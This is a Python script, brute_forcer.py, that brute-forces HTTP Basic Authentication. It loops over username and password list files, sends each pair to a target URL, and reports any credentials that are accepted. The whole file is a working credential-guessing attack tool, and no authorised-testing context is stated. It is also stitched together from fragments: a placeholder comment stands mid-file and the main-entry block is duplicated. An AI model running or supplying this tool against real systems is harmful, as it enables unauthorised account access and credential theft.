import requests
from requests.auth import HTTPBasicAuth

def basic_auth_brute_force(url, username_list, password_list):
    """Attempts to brute-force HTTP Basic Authentication."""
    for username in username_list:
        for password in password_list:
            print(f"Trying username: {username}, password: {password}")
            try:
                response = requests.get(url, auth=HTTPBasicAuth(username, password), timeout=5)
                if response.status_code == 200:
                    print(f"\nSuccess! Credentials found:")
                    print(f"Username: {username}, Password: {password}")
                    return True  # Found valid credentials
                elif response.status_code == 401:
                    print(f"  - {username}:{password} - Authentication failed (401 Unauthorized)")
                else:
                    print(f"  - {username}:{password} - Unexpected status code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"  - {username}:{password} - Connection error: {e}")
    print("\nNo valid credentials found in the provided lists.")
    return False  # No valid credentials found

if __name__ == "__main__":
    target_url = input("Enter target URL with Basic Authentication (e.g., http://example.com): ")
    username_file = input("Enter path to username list file: ")
    password_file = input("Enter path to password list file: ")

    try:
        with open(username_file, 'r') as file:
            usernames = [line.strip() for line in file]
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print("Error: Username or password file not found.")
        exit()

    print(f"\nStarting brute-force attack on: {target_url}")
    basic_auth_brute_force(target_url, usernames, passwords)

    print("Brute-force process completed.")

    # ... (rest of brute_forcer.py code from before, including imports and basic_auth_brute_force function) ...

def main_brute_force_function(target_url_input, username_file_input, password_file_input): # Renamed and made into a function that takes arguments
    target_url = target_url_input # Use input directly
    username_file = username_file_input # Use input directly
    password_file = password_file_input # Use input directly

    try:
        with open(username_file, 'r') as file:
            usernames = [line.strip() for line in file]
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        print("Error: Username or password file not found.")
        return

    print(f"\nStarting brute-force attack on: {target_url}")
    basic_auth_brute_force(target_url, usernames, passwords)

    print("Brute-force process completed.")


if __name__ == "__main__":
    target_url = input("Enter target URL with Basic Authentication (e.g., http://example.com): ") # Keep input prompts for direct execution of brute_forcer.py
    username_file = input("Enter path to username list file: ")
    password_file = input("Enter path to password list file: ")
    main_brute_force_function(target_url, username_file, password_file) # Call the function instead of direct code